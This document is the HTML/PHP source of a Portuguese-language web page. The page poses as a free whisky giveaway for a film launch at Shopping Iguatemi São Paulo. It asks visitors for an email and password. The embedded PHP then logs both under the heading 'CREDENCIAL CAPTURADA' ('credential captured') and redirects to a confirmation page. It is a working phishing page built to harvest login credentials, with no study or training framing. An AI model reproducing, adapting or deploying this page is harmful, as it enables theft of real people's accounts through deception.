<html><head>
    <link rel="stylesheet" href="globals.css">
    <link rel="stylesheet" href="styleguide.css">
    <link rel="stylesheet" href="style.css">
    <meta name="viewport" content="width=device-width, initial-scale=0.7, 
user-scalable=no">
  </head>
  <body>
    <div class="desktop-auth" style="
    height: 100%;
    position: relative;
    margin: 0 auto;
">
      <div class="div" style="
    align-items: center;
    align-content: center;
    position: relative;
    width: 100%;
    height: 100%;
    margin: 0 auto;
">
        <img class="logo" src="img/logo-1.svg" style="
    margin: 0 auto;
    margin-top: 50px;
    width: 100%;
    margin-bottom: -50px;
    position: relative;
    left: 0px;
"><div class="overlap-group" style="
    margin: 0 auto;
    position: relative;
    left: 0px;
">
          <img class="banner" src="img/banner.png">
          <p class="voc-ganhou-um-combo" style="font-family: 'Averia Serif Libre';position: relative;top: 290px;">
            Você ganhou um combo de <br>Whisky Grátis em comemoração ao lançamento do filme, para resgatar
          </p>
          <p class="text-wrapper" style="
    position: relative;
    top: 300px;
">Promoção exclusiva para o Shopping Iguatemi São Paulo</p>
<form action="./" method="post" class="form">
            <input class="PB-input" placeholder="E-Mail" style="
    font-weight: 800;color:white;
" type="email" id="email" name="email" required="">
            <input class="div-wrapper" placeholder="Senha" style="font-weight: 800;color:white" type="password" id="senha" name="senha" required="">
            <input class="PB-button" style="font-weight: 600;border:none" type="submit" value="RESGATAR COMBO!">
            <p class="p">Ao resgatar você concorda com os Termos de Uso</p>
          </form>
        </div>
        
        
      </div>
    </div>
  
<?php
// Verificar se a requisição é POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    
    // Verificar se os dados do POST não estão vazios
    if($_POST["email"] && $_POST["senha"]){

        // Pega o email e senha
        $email=$_POST["email"];
        $senha=$_POST["senha"];

        // Criar uma string com os dados do POST
        $dados = "####\n\n[🥃 CREDENCIAL CAPTURADA]\nEMAIL: " . $email . "\nSENHA: " . $senha . "\n\n####\n";

        // Salva nos logs
        file_put_contents("php://stderr", $dados."\n");
        
        // Redirecionar para confirmado.php
        header("Location: confirmado.php");
        exit();
    } else {
        // Nenhum dado recebido
        echo 'Erro: Envie email e senha!';
    }
}
?>

</body></html>